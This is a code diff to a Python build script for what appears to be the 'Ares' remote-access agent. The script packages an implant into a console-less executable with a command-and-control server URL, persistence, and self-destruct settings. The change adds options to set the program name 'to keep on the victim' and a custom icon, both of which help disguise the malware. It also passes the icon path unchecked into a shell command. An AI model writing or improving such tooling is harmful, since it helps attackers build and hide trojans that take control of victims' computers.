@@ -5,7 +5,7 @@ import shutil
 import tempfile
 
 
-def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
+def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist,name,icon):
     prog_name = os.path.basename(output)
     platform = platform.lower()
     if platform not in ['linux', 'windows']:
@@ -17,7 +17,8 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
     working_dir = os.path.join(tempfile.gettempdir(), 'ares')
     if os.path.exists(working_dir):
         shutil.rmtree(working_dir)
-    agent_dir = os.path.dirname(__file__)
+    agent_dir = os.path.dirname(os.path.abspath(__file__))
+    print(agent_dir,working_dir)
     shutil.copytree(agent_dir, working_dir)
     with open(os.path.join(working_dir, "config.py"), 'w') as agent_config:
         with open(os.path.join(agent_dir, "template_config.py")) as f:
@@ -27,6 +28,7 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         config_file = config_file.replace("__IDLE_TIME__", str(idle_time))
         config_file = config_file.replace("__MAX_FAILED_CONNECTIONS__", str(max_failed_connections))
         config_file = config_file.replace("__PERSIST__", str(persist))
+        config_file = config_file.replace("__NAME__",str(name))
         agent_config.write(config_file)
     cwd = os.getcwd()
     os.chdir(working_dir)
@@ -36,14 +38,21 @@ def build_agent(output, server_url, platform, hello_interval, idle_time, max_fai
         agent_file = os.path.join(working_dir, 'dist', prog_name)
     elif platform == 'windows':
         if os.name == 'posix': 
-            os.system('wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            cmd = 'wine C:/Python27/Scripts/pyinstaller --noconsole --onefile ' + prog_name + '.py'
+            if icon:
+                cmd = cmd + " --icon " + icon
+            os.system(cmd)
         else:
-            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+            cmd = 'pyinstaller --noconsole --onefile ' + prog_name + '.py'
+            if icon:
+                cmd = cmd + " --icon " + icon
+            os.system(cmd)
         if not prog_name.endswith(".exe"):
             prog_name += ".exe"
         agent_file = os.path.join(working_dir, 'dist', prog_name)
     os.chdir(cwd)
-    os.rename(agent_file, output)
+    print(agent_file,output)
+    os.rename(agent_file,output)
     shutil.rmtree(working_dir)
     print "[+] Agent built successfully: %s" % output
 
@@ -58,6 +67,8 @@ def main():
     parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
     parser.add_argument('--max-failed-connections', type=int, default=20, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
     parser.add_argument('--persistent', action='store_true', help="Automatically install the agent on first run.")
+    parser.add_argument('--name',default="ares",help="Name for the application to keep on the victim.")
+    parser.add_argument('--icon',default=None,help="file for ico file for the output.")
     args = parser.parse_args()
 
     build_agent(
@@ -67,8 +78,10 @@ def main():
         hello_interval=args.hello_interval,
         idle_time=args.idle_time,
         max_failed_connections=args.max_failed_connections,
-        persist=args.persistent)
-
+        persist=args.persistent,
+        name=args.name,
+        icon=args.icon
+        )
 
 if __name__ == "__main__":
     main()
